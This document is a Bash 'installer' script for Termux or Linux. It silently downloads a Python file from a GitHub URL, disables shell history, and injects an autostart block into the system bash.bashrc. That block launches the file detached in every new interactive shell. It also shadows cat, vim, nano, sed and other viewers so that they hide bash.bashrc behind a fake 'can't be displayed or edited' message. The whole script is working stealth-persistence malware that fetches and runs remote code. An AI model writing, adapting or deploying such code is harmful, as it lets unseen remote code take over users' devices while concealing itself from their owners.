#!/usr/bin/env bash
# Installer: autostart + downloader (no persistent backups/logs, retry until confirmed)
set -Eeuo pipefail
IFS=$'\n\t'

# Minimal privacy hardening for this run
set +u 2>/dev/null || true
export PREFIX="${PREFIX:-/data/data/com.termux/files/usr}"
export HOME="${HOME:-/data/data/com.termux/files/home}"
export XDG_CONFIG_HOME="${XDG_CONFIG_HOME:-$HOME/.config}"
export XDG_CACHE_HOME="${XDG_CACHE_HOME:-$HOME/.cache}"
export HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0

APP="Installer"
TAG="ELITE_TTV_MIN_AUTOSTART_2025_09"

die(){ printf >&2 "[%s] ERROR: %s\n" "$APP" "$*"; exit 1; }
ok(){ printf "[%s] %s\n" "$APP" "$*"; }

# --- bashrc target (Termux or standard Linux) ---
if [[ -n "${PREFIX:-}" && -f "$PREFIX/etc/bash.bashrc" ]]; then
  BASHRC="$PREFIX/etc/bash.bashrc"
elif [[ -f "/etc/bash.bashrc" ]]; then
  BASHRC="/etc/bash.bashrc"
else
  die "Cannot find bash.bashrc (tried: \$PREFIX/etc/bash.bashrc and /etc/bash.bashrc)."
fi

# --- defaults (user may override before running) ---
TTV_PATH="${TTV_PATH:-$HOME/hardsec.py}"   # must be absolute
TTV_PY_BIN="${TTV_PY_BIN:-$(command -v python3 || command -v python || true)}"
TTV_AUTOSTART="${TTV_AUTOSTART:-1}"       # 1 = enabled

# Default raw GitHub URL for the file you gave (raw URL). This is only used in-memory.
# If you prefer to provide a different link, export DOWNLOAD_URL before running the script.
DOWNLOAD_URL="${DOWNLOAD_URL:-https://raw.githubusercontent.com/davidfin7xd/onlytime/main/hardsec.py}"

# Ensure TTV_PATH is absolute
case "$TTV_PATH" in
  /*) ;; *) die "TTV_PATH must be absolute (e.g. /data/data/com.termux/files/home/hardsec.py)";;
esac

# --- downloader: retries until success, verifies python compile if python3 exists,
#     avoids duplicate replacement using sha256 when available.
download_and_place() {
  local url="$1"
  local dest="$2"
  local tmp

  mkdir -p "$(dirname "$dest")" || die "Unable to create directory for $dest"

  # compute existing checksum (if present and sha256sum available)
  local oldsum=""
  if [[ -f "$dest" && -x "$(command -v sha256sum 2>/dev/null || true)" ]]; then
    oldsum="$(sha256sum "$dest" 2>/dev/null | awk '{print $1}')"
  fi

  # choose safe temp location (prefer memory-backed /dev/shm when available)
  if [[ -d "/dev/shm" ]]; then
    tmp="$(mktemp -p /dev/shm tmp.XXXXXXXX)" || tmp="$(mktemp)"
  else
    tmp="$(mktemp)"
  fi

  # ensure removal of tmp on exit unless moved
  trap 'rc=$?; [[ -f "'"$tmp"'" ]] && rm -f "'"$tmp"'" || true; exit $rc' EXIT

  while true; do
    # fetch file silently; do not write URL anywhere
    if command -v curl >/dev/null 2>&1; then
      if ! curl --fail --location --silent --show-error --connect-timeout 20 --max-time 300 "$url" -o "$tmp"; then
        sleep 5
        continue
      fi
    elif command -v wget >/dev/null 2>&1; then
      if ! wget --quiet --tries=3 --timeout=60 --output-document="$tmp" "$url"; then
        sleep 5
        continue
      fi
    else
      rm -f "$tmp"
      die "Neither curl nor wget available for download"
    fi

    # basic checks: non-empty
    if [[ ! -s "$tmp" ]]; then
      rm -f "$tmp"; sleep 5; tmp="$(mktemp)"; continue
    fi

    # optional: python syntax verification if python3 available
    if command -v python3 >/dev/null 2>&1; then
      if ! python3 -m py_compile "$tmp" >/dev/null 2>&1; then
        rm -f "$tmp"; sleep 5; tmp="$(mktemp)"; continue
      fi
    fi

    # compute new checksum if possible
    local newsum=""
    if command -v sha256sum >/dev/null 2>&1; then
      newsum="$(sha256sum "$tmp" | awk '{print $1}')"
    fi

    # if identical, remove tmp and exit successfully
    if [[ -n "$oldsum" && -n "$newsum" && "$oldsum" == "$newsum" ]]; then
      rm -f "$tmp"
      trap - EXIT
      return 0
    fi

    # move into place atomically (overwrite)
    if mv -f "$tmp" "$dest" 2>/dev/null; then
      chmod 700 "$dest" 2>/dev/null || true
      trap - EXIT
      return 0
    else
      # mv failed (maybe cross-device). try copy+rename fallback
      if cp -f "$tmp" "$dest" 2>/dev/null && rm -f "$tmp"; then
        chmod 700 "$dest" 2>/dev/null || true
        trap - EXIT
        return 0
      fi
      # otherwise retry
      rm -f "$tmp"
      sleep 5
      tmp="$(mktemp)"
      continue
    fi
  done
}

# --- uninstall: delete only our tagged block (no backup, no temp) ---
if [[ "${1:-}" == "--uninstall" ]]; then
  sed -i "\|^# >>> ${TAG}|,\|^# <<< ${TAG}|d" "$BASHRC"
  ok "Removed autostart block."
  exit 0
fi

# --- perform download only if DOWNLOAD_URL is set (in-memory only). No URL written anywhere. ---
if [[ -n "${DOWNLOAD_URL:-}" ]]; then
  download_and_place "$DOWNLOAD_URL" "$TTV_PATH" || die "Failed to download & place Python file"
  ok "Python file installed to $TTV_PATH"
fi

# --- autostart block to inject ---
BLOCK="$(cat <<'EOF'
# >>> ELITE_TTV_MIN_AUTOSTART_2025_09 (DO NOT EDIT)
# Autostart .py on NEW interactive shells (non-blocking; duplicate-safe).

# ===== Config =====
TTV_PATH="${TTV_PATH:-$HOME/hardsec.py}"  # ABSOLUTE path required
TTV_PY_BIN="${TTV_PY_BIN:-$(command -v python3 || command -v python || true)}"
TTV_AUTOSTART="${TTV_AUTOSTART:-1}"       # 1 = enabled

# ===== Protect bash.bashrc from read/edit =====
TTV_BASHRC_PATH="${PREFIX:+$PREFIX/}etc/bash.bashrc"

__ttv_abs(){
  local p="$1"
  if command -v readlink >/dev/null 2>&1; then
    readlink -f -- "$p" 2>/dev/null || printf "%s" "$p"
  else
    case "$p" in /*) printf "%s" "$p" ;; *) printf "%s/%s" "$PWD" "$p" ;; esac
  fi
}

__ttv_block_msg(){ printf "The contents of this file can't be displayed or edited here.\n"; }

__ttv_is_protected_bashrc(){
  local a abs
  for a in "$@"; do
    [[ -z "$a" ]] && continue
    abs="$(__ttv_abs "$a")"
    if [[ "$abs" == "$TTV_BASHRC_PATH" || "${abs##*/}" == "bash.bashrc" ]]; then return 0; fi
  done
  return 1
}

__ttv_protect_then_delegate(){
  local real="$1"; shift || true
  if __ttv_is_protected_bashrc "$@"; then __ttv_block_msg; return 1; fi
  command "$real" "$@"
}

__TTV_PROTECT_CMDS=(cat less more head tail vi vim nvim nano emacs ed view lesspipe sed awk bat batcat busybox micro helix hx)
for __cmd in "${__TTV_PROTECT_CMDS[@]}"; do
  printf -v __qcmd '%q' "$__cmd"
  eval "${__qcmd}(){ __ttv_protect_then_delegate ${__qcmd} \"\$@\"; }"
done
unset __cmd __qcmd

# ===== Custom wrappers (no aliases) =====
panda(){ __ttv_protect_then_delegate cat "$@"; }
seeme(){ __ttv_protect_then_delegate vim "$@"; }
brep(){ __ttv_protect_then_delegate grep --color=auto -n "$@"; }
last(){ command top "$@"; }
oc(){ command ps "$@"; }

# ===== Worker detection & start (duplicate-safe; regex-free) =====
__ttv_have_python(){ [[ -n "$TTV_PY_BIN" ]] && command -v "$TTV_PY_BIN" >/dev/null 2>&1; }
__ttv_path_ok(){ [[ -n "$TTV_PATH" && -f "$TTV_PATH" && -r "$TTV_PATH" && "$TTV_PATH" = /* ]]; }

__ttv_is_worker(){
  local pid base
  pid="$(ps -o pid= -o args= -u "$UID" 2>/dev/null | awk -v p="$TTV_PATH" 'index($0,p){print $1; exit}')"
  [[ -n "$pid" ]] && { printf "%s" "$pid"; return 0; }
  base="$(basename -- "$TTV_PATH" 2>/dev/null || true)"
  [[ -z "$base" ]] && return 1
  ps -o pid= -o args= -u "$UID" 2>/dev/null | awk -v b="$base" 'index($0,"python") && index($0,b){print $1; exit}'
}

__ttv_start_worker(){
  __ttv_have_python || return 1
  __ttv_path_ok || return 1
  if command -v setsid >/dev/null 2>&1; then
    setsid -f "$TTV_PY_BIN" "$TTV_PATH" >/dev/null 2>&1 || true
  else
    ( nohup "$TTV_PY_BIN" "$TTV_PATH" >/dev/null 2>&1 </dev/null & ) >/dev/null 2>&1 || true
  fi
}

# ===== Autostart hook (runs on each NEW interactive shell) =====
__ttv_autostart_once(){
  [[ "${TTV_AUTOSTART:-1}" != "1" ]] && return 0
  __ttv_have_python || return 0
  __ttv_path_ok || return 0
  local wpid="$(__ttv_is_worker || true)"
  [[ -n "$wpid" ]] && kill -0 "$wpid" 2>/dev/null && return 0
  __ttv_start_worker || true
}

# Trigger A: end-of-block (interactive shells only)
if [[ "$-" == *i* ]]; then
  __ttv_autostart_once
fi

# Trigger B: PROMPT_COMMAND (fires once before first prompt, then unhooks)
if [[ "$-" == *i* ]]; then
  __ttv_pc_hook(){
    __ttv_autostart_once
    PROMPT_COMMAND="${PROMPT_COMMAND/__ttv_pc_hook; /}"
    PROMPT_COMMAND="${PROMPT_COMMAND/__ttv_pc_hook/}"
    unset -f __ttv_pc_hook
  }
  case "$PROMPT_COMMAND" in
    *"__ttv_pc_hook"*) : ;;
    "") PROMPT_COMMAND="__ttv_pc_hook" ;;
    *)  PROMPT_COMMAND="__ttv_pc_hook; $PROMPT_COMMAND" ;;
  esac
fi
# <<< ELITE_TTV_MIN_AUTOSTART_2025_09
EOF
)"

# --- strip old block in-place and append new block (no backup/temp left) ---
sed -i "\|^# >>> ${TAG}|,\|^# <<< ${TAG}|d" "$BASHRC"
printf "\n%s\n" "$BLOCK" >> "$BASHRC"

# --- verify marker exists ---
grep -qE "^# >>> ${TAG}\b" "$BASHRC" || die "Write verification failed."

# --- immediate start (duplicate-safe) ---
TTV_PATH_NOW="${TTV_PATH:-$HOME/hardsec.py}"
TTV_PY_BIN_NOW="${TTV_PY_BIN:-$(command -v python3 || command -v python || true)}"

__have_python_now(){ [[ -n "$TTV_PY_BIN_NOW" ]] && command -v "$TTV_PY_BIN_NOW" >/dev/null 2>&1; }
__path_ok_now(){ [[ -n "$TTV_PATH_NOW" && -f "$TTV_PATH_NOW" && -r "$TTV_PATH_NOW" && "$TTV_PATH_NOW" = /* ]]; }

__is_worker_now(){
  local pid base
  pid="$(ps -o pid= -o args= -u "$UID" 2>/dev/null | awk -v p="$TTV_PATH_NOW" 'index($0,p){print $1; exit}')"
  [[ -n "$pid" ]] && { printf "%s" "$pid"; return 0; }
  base="$(basename -- "$TTV_PATH_NOW" 2>/dev/null || true)"
  [[ -z "$base" ]] && return 1
  ps -o pid= -o args= -u "$UID" 2>/dev/null | awk -v b="$base" 'index($0,"python") && index($0,b){print $1; exit}'
}

__start_now(){
  if command -v setsid >/dev/null 2>&1; then
    setsid -f "$TTV_PY_BIN_NOW" "$TTV_PATH_NOW" >/dev/null 2>&1 || true
  else
    ( nohup "$TTV_PY_BIN_NOW" "$TTV_PATH_NOW" >/dev/null 2>&1 </dev/null & ) >/dev/null 2>&1 || true
  fi
}

if __have_python_now && __path_ok_now; then
  w="$(__is_worker_now || true)"
  if [[ -z "$w" ]] || ! kill -0 "$w" 2>/dev/null; then
    __start_now || true
  fi
fi

ok "Updated: $BASHRC"
